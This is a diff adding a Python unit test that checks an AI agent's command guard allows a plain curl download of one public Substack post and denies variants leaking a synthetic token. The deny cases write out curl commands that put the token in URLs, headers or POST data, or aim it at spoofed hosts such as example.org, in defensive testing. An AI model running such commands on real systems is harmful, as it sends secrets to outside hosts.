@@ -63,6 +63,36 @@ def decision(output: dict | None) -> str:
 
 
 class SecretGuardParityTests(unittest.TestCase):
+    def test_hinge_public_issue_route_retains_secret_checks(self):
+        # Published issue.json and unauthenticated Substack archive response
+        # identify this exact public slug (post 217986768).
+        base = 'https://hingedaily.substack.com'
+        slug = 'the-hinge-2-29-september-2026'
+        token = 'Synthetic9Opaque_' * 3
+        for prefix in ('/api/v1/posts/', '/p/'):
+            url = base + prefix + slug
+            command = f"curl -fsSL '{url}' -o /private/tmp/hinge-correct-issue2/public-before.json"
+            cases = [(command, 'allow')]
+            variants = (
+                url + '?token=' + token, url + '#' + token, url + '/' + token,
+                url.replace('hingedaily.substack.com', 'hingedaily.substack.com.example.org'),
+                url.replace('hingedaily.substack.com', 'hingedaily.substack.com@example.org'),
+                url.replace('https://', 'http://'), url + 'extra',
+                url.replace(slug, token),
+            )
+            cases.extend((f"curl '{variant}'", 'deny') for variant in variants)
+            cases.extend((command + f" {option} '{token}'", 'deny') for option in ('-H', '-d'))
+            cases.extend((f"curl {option} '{url}' https://example.org", 'deny') for option in ('-H', '-d'))
+            for shell, expected in cases:
+                self.assert_both(shell, expected)
+                for tool in ('functions.exec_command', 'functions.exec'):
+                    content = shell if tool != 'functions.exec' else (
+                        'text(await tools.exec_command(' + json.dumps({'cmd': shell}) + '));'
+                    )
+                    with self.subTest(tool=tool, command=shell):
+                        self.assertEqual(decision(run_guard(GUARDS['codex'], content,
+                                                           cwd=self.repo, tool=tool)), expected)
+
     def test_terminal_report_prose_does_not_activate_network_scan(self):
         prefix = "python3 - <<'PY'\nimport pathlib,json\nprint('local report preparation')\nPY\n"
         body = ('A certificate-verified curl request returned public evidence.\n'
